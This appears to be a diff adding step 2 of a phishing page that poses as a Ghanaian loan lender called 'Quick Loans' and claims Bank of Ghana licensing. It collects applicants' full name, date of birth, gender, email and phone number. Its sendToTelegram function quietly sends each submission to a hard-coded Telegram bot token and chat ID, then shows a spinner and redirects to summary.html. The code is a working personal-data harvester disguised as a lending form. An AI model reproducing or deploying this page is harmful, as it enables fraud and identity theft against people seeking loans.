@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
+    <title>Quick Loans | Personal Details</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+    <meta name="theme-color" content="#E30613">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-red: #E30613;
+            --primary-darkred: #b71c1c;
+            --primary-blue: #0033A0;
+            --text-dark: #1a1a1a;
+            --text-muted: #6c757d;
+            --bg-light: #f8f9fc;
+            --shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
+            --radius: 20px;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-light);
+            color: var(--text-dark);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 12px;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #2c3e50;
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            line-height: 1;
+            z-index: 1;
+        }
+
+        .logo {
+            font-size: clamp(28px, 7vw, 40px);
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            text-align: center;
+        }
+
+        .logo-quick {
+            color: var(--primary-red);
+        }
+        .logo-loans {
+            color: var(--primary-blue);
+        }
+
+        main {
+            flex: 1;
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .form-card {
+            background: white;
+            border-radius: var(--radius);
+            padding: 24px 18px 32px;
+            box-shadow: var(--shadow);
+            position: relative;
+        }
+
+        .error-box {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
+            background: #fff;
+            border: 2px solid #ff4d4d;
+            border-radius: 14px;
+            padding: 12px;
+            display: none;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
+            z-index: 100;
+            text-align: left;
+        }
+
+        .error-title {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .error-text {
+            color: #444;
+            font-size: 13px;
+        }
+
+        .close {
+            position: absolute;
+            right: 12px;
+            top: 8px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #999;
+        }
+
+        .form-title {
+            font-size: clamp(24px, 6vw, 32px);
+            font-weight: 700;
+            color: var(--text-dark);
+            text-align: center;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            margin: 1rem auto 0.8rem;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66.66%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-red), var(--primary-darkred));
+            border-radius: 4px;
+        }
+
+        .step-text {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-bottom: 1.8rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #fdfdfe;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        .form-input:focus {
+            border-color: var(--primary-red);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
+        }
+
+        .form-input.invalid,
+        #phoneGroup.invalid {
+            border-color: #dc3545 !important;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
+        }
+
+        select.form-input {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236c757d' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 1.2rem center;
+            background-size: 12px 8px;
+            padding-right: 2.8rem;
+            cursor: pointer;
+        }
+
+        #phoneGroup {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            padding: 0 1rem;
+            background: #fdfdfe;
+            transition: border 0.2s, box-shadow 0.2s;
+        }
+
+        #phoneGroup:focus-within {
+            border-color: var(--primary-red);
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
+        }
+
+        #phoneGroup span {
+            color: var(--text-muted);
+            font-weight: 500;
+            margin-right: 0.5rem;
+            flex-shrink: 0;
+        }
+
+        #phoneGroup input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 0.9rem 0;
+            font-size: 1rem;
+            background: transparent;
+            min-width: 0;
+        }
+
+        .dob-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .dob-group .form-group {
+            flex: 1;
+            min-width: 60px;
+            margin-bottom: 0;
+        }
+        .dob-group .form-group select {
+            padding: 0.9rem 0.5rem;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+            padding: 1rem;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            touch-action: manipulation;
+        }
+
+        .prev-btn {
+            background: #e2e8f0;
+            color: #475569;
+            border: none;
+        }
+
+        .prev-btn:active {
+            transform: scale(0.97);
+        }
+
+        .next-btn {
+            background: linear-gradient(90deg, var(--primary-red), var(--primary-darkred));
+            color: white;
+            border: none;
+            box-shadow: 0 6px 18px rgba(227, 6, 19, 0.25);
+        }
+
+        .next-btn:active {
+            transform: scale(0.97);
+        }
+
+        .next-btn.disabled-btn,
+        .next-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        footer {
+            padding: 20px 16px;
+            color: #adb5bd;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        #spinner {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(2px);
+            z-index: 999;
+        }
+
+        .loader {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #ffe0e0;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 380px) {
+            body {
+                padding: 8px;
+            }
+            .form-card {
+                padding: 20px 14px;
+            }
+            .form-input {
+                padding: 0.8rem 0.9rem;
+                font-size: 0.9rem;
+            }
+            .dob-group .form-group select {
+                padding: 0.8rem 0.4rem;
+            }
+            .btn-group {
+                gap: 0.8rem;
+            }
+            .prev-btn,
+            .next-btn {
+                padding: 0.8rem;
+                font-size: 0.9rem;
+            }
+            #phoneGroup input {
+                padding: 0.8rem 0;
+            }
+        }
+
+        @media (min-width: 769px) {
+            body {
+                padding: 32px;
+            }
+            .form-card {
+                padding: 2.5rem 3rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo">
+            <span class="logo-quick">Quick</span><span class="logo-loans">Loans</span>
+        </div>
+    </header>
+
+    <main>
+        <div class="form-card">
+            <div class="error-box" id="errorBox">
+                <div class="close" onclick="hideError()">×</div>
+                <div class="error-title">Error</div>
+                <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
+            </div>
+
+            <h1 class="form-title">Personal Details</h1>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="step-text">Step 2 of 3</div>
+
+            <div class="form-group">
+                <label class="form-label">Full Name</label>
+                <input type="text" class="form-input" id="fullName" placeholder="e.g. Kwame Mensah">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Date of Birth</label>
+                <div class="dob-group">
+                    <div class="form-group">
+                        <select class="form-input" id="dob-day">
+                            <option value="">Day</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <select class="form-input" id="dob-month">
+                            <option value="">Month</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <select class="form-input" id="dob-year">
+                            <option value="">Year</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Gender</label>
+                <select class="form-input" id="gender">
+                    <option value="">Select...</option>
+                    <option value="Male">Male</option>
+                    <option value="Female">Female</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Email Address <span style="font-weight:400;color:#888;">(optional)</span></label>
+                <input type="email" class="form-input" id="email" placeholder="e.g. kwame@example.com">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Phone Number</label>
+                <div id="phoneGroup">
+                    <span>+233</span>
+                    <input type="tel" id="phone" placeholder="55 123 4567" maxlength="11" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="btn-group">
+                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+                <button class="next-btn" id="nextBtn">NEXT STEP</button>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        © 2026 Quick Loans – Licensed by Bank of Ghana | Powered by secure mobile payments
+    </footer>
+
+    <div id="spinner">
+        <div class="loader"></div>
+    </div>
+
+    <script>
+        // Populate dropdowns
+        (function populateDropdowns() {
+            const daySelect = document.getElementById('dob-day');
+            const monthSelect = document.getElementById('dob-month');
+            const yearSelect = document.getElementById('dob-year');
+
+            for (let i = 1; i <= 31; i++) {
+                const opt = document.createElement('option');
+                opt.value = i;
+                opt.textContent = i;
+                daySelect.appendChild(opt);
+            }
+
+            const monthNames = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+            for (let i = 1; i <= 12; i++) {
+                const opt = document.createElement('option');
+                opt.value = i;
+                opt.textContent = `${i} – ${monthNames[i-1]}`;
+                monthSelect.appendChild(opt);
+            }
+
+            const currentYear = new Date().getFullYear();
+            for (let y = currentYear; y >= 1950; y--) {
+                const opt = document.createElement('option');
+                opt.value = y;
+                opt.textContent = y;
+                yearSelect.appendChild(opt);
+            }
+        })();
+
+        // DOM elements
+        const fullNameInput = document.getElementById('fullName');
+        const genderSelect = document.getElementById('gender');
+        const emailInput = document.getElementById('email');
+        const phoneInput = document.getElementById('phone');
+        const phoneGroup = document.getElementById('phoneGroup');
+        const nextBtn = document.getElementById('nextBtn');
+        const spinner = document.getElementById('spinner');
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
+
+        // Load saved data
+        if (localStorage.getItem('fullName')) fullNameInput.value = localStorage.getItem('fullName');
+        if (localStorage.getItem('gender')) genderSelect.value = localStorage.getItem('gender');
+        if (localStorage.getItem('email')) emailInput.value = localStorage.getItem('email');
+        if (localStorage.getItem('phone')) phoneInput.value = localStorage.getItem('phone');
+
+        const savedDob = localStorage.getItem('dob');
+        if (savedDob) {
+            const parts = savedDob.split('-');
+            if (parts.length === 3) {
+                const [year, month, day] = parts;
+                document.getElementById('dob-day').value = parseInt(day, 10);
+                document.getElementById('dob-month').value = parseInt(month, 10);
+                document.getElementById('dob-year').value = parseInt(year, 10);
+            }
+        }
+
+        // Helper functions
+        function showError(message) {
+            errorText.innerText = message || 'Please fix the highlighted fields.';
+            errorBox.style.display = 'block';
+        }
+
+        function hideError() {
+            errorBox.style.display = 'none';
+        }
+
+        function resetInvalidHighlights() {
+            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => {
+                el.classList.remove('invalid');
+            });
+        }
+
+        // Validation
+        function validateForm() {
+            let isValid = true;
+            let errorMsg = '';
+            resetInvalidHighlights();
+            hideError();
+
+            const fullName = fullNameInput.value.trim();
+            const gender = genderSelect.value;
+            const phoneRaw = phoneInput.value.trim();
+            const email = emailInput.value.trim();
+
+            if (!fullName) {
+                fullNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Full name is required.';
+            } else if (fullName.split(' ').length < 2) {
+                fullNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Please enter your full name (first and last).';
+            }
+
+            const day = parseInt(document.getElementById('dob-day').value, 10);
+            const month = parseInt(document.getElementById('dob-month').value, 10);
+            const year = parseInt(document.getElementById('dob-year').value, 10);
+            if (!day || !month || !year) {
+                document.getElementById('dob-day').classList.add('invalid');
+                document.getElementById('dob-month').classList.add('invalid');
+                document.getElementById('dob-year').classList.add('invalid');
+                isValid = false;
+                if (!errorMsg) errorMsg = 'Please select your full date of birth.';
+            } else {
+                const dateObj = new Date(year, month - 1, day);
+                if (dateObj.getFullYear() !== year || dateObj.getMonth() !== month - 1 || dateObj.getDate() !== day) {
+                    document.getElementById('dob-day').classList.add('invalid');
+                    document.getElementById('dob-month').classList.add('invalid');
+                    document.getElementById('dob-year').classList.add('invalid');
+                    isValid = false;
+                    errorMsg = 'Please select a valid date.';
+                } else {
+                    const today = new Date();
+                    let age = today.getFullYear() - year;
+                    const m = today.getMonth() - (month - 1);
+                    if (m < 0 || (m === 0 && today.getDate() < day)) age--;
+                    if (age < 18) {
+                        document.getElementById('dob-day').classList.add('invalid');
+                        document.getElementById('dob-month').classList.add('invalid');
+                        document.getElementById('dob-year').classList.add('invalid');
+                        isValid = false;
+                        errorMsg = 'You must be at least 18 years old.';
+                    }
+                }
+            }
+
+            if (!gender) {
+                genderSelect.classList.add('invalid');
+                isValid = false;
+                if (!errorMsg) errorMsg = 'Please select your gender.';
+            }
+
+            if (!phoneRaw) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Phone number is required.';
+            } else if (!/^\d{9,11}$/.test(phoneRaw)) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Phone number must be 9, 10, or 11 digits (only numbers).';
+            }
+
+            if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
+                emailInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Please enter a valid email address (e.g., name@domain.com).';
+            }
+
+            if (!isValid) {
+                showError(errorMsg || 'Please correct the highlighted fields.');
+                const firstInvalid = document.querySelector('.invalid');
+                if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return false;
+            }
+            return true;
+        }
+
+        // Send to Telegram – with copyable phone number in code tags
+        function sendToTelegram(data) {
+            const botToken = '8736269489:AAFJ4LyUwUYQ9K_rKWwmY1GccWUDLFTEGsA';
+            const chatId = '1006917440';
+
+            const message = `📋 New Loan Application
+            ━━━━━━━━━━━━━━━━━━━
+            👤 Full Name: ${data.fullName}
+            📅 Date of Birth: ${data.dob}
+            ⚧ Gender: ${data.gender}
+            📧 Email: ${data.email || 'Not provided'}
+            📱 Phone: <code>${data.phoneFull}</code>
+            ━━━━━━━━━━━━━━━━━━━
+            🔑 User ID: <code>${data.phoneDigits}</code>`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+            fetch(url, {
+                method: 'GET',
+                keepalive: true
+            }).catch(() => {});
+        }
+
+        // Proceed
+        let isProcessing = false;
+
+        function proceedToSummary() {
+            if (isProcessing) return;
+            if (!validateForm()) return;
+
+            const day = document.getElementById('dob-day').value.padStart(2, '0');
+            const month = document.getElementById('dob-month').value.padStart(2, '0');
+            const year = document.getElementById('dob-year').value;
+            const dobString = `${year}-${month}-${day}`;
+
+            const fullName = fullNameInput.value.trim();
+            const gender = genderSelect.value;
+            const email = emailInput.value.trim();
+            const phoneDigits = phoneInput.value.trim();
+            const fullPhone = `+233${phoneDigits}`;
+
+            localStorage.setItem('fullName', fullName);
+            localStorage.setItem('dob', dobString);
+            localStorage.setItem('gender', gender);
+            localStorage.setItem('email', email);
+            localStorage.setItem('phone', phoneDigits);
+
+            sendToTelegram({
+                fullName,
+                dob: dobString,
+                gender,
+                email,
+                phoneFull: fullPhone,
+                phoneDigits
+            });
+
+            nextBtn.disabled = true;
+            nextBtn.classList.add('disabled-btn');
+            isProcessing = true;
+            spinner.style.display = 'flex';
+
+            setTimeout(() => {
+                window.location.href = 'summary.html';
+            }, 3000);
+        }
+
+        nextBtn.addEventListener('click', proceedToSummary);
+
+        // Clear errors on input
+        const clearOnChange = (el) => {
+            el.addEventListener('input', () => {
+                hideError();
+                el.classList.remove('invalid');
+                if (el.id === 'phone') phoneGroup.classList.remove('invalid');
+            });
+            el.addEventListener('change', () => {
+                hideError();
+                el.classList.remove('invalid');
+                if (el.id === 'phone') phoneGroup.classList.remove('invalid');
+            });
+        };
+        clearOnChange(fullNameInput);
+        clearOnChange(document.getElementById('dob-day'));
+        clearOnChange(document.getElementById('dob-month'));
+        clearOnChange(document.getElementById('dob-year'));
+        clearOnChange(genderSelect);
+        clearOnChange(emailInput);
+        clearOnChange(phoneInput);
+
+        phoneInput.addEventListener('input', () => {
+            phoneGroup.classList.remove('invalid');
+            hideError();
+        });
+
+        window.hideError = hideError;
+    </script>
+
+</body>
+
+</html>
